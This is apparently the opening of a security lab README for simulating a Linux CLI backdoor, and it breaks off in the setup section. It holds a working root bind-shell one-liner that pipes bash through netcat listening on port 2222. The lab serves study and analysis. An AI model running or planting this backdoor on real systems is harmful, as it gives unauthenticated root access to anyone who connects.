# 🐧 Linux CLI Backdoor Lab

This lab explores a Linux backdoor using the CLI. We simulate both attacker and analyst views using 3 Kali Linux terminals.

---

## 🔧 Lab Setup

### Terminal 1 – Running the Backdoor

```bash
sudo su -
mknod backpipe p
/bin/bash backpipe 0<backpipe | nc -l 2222 1>backpipe
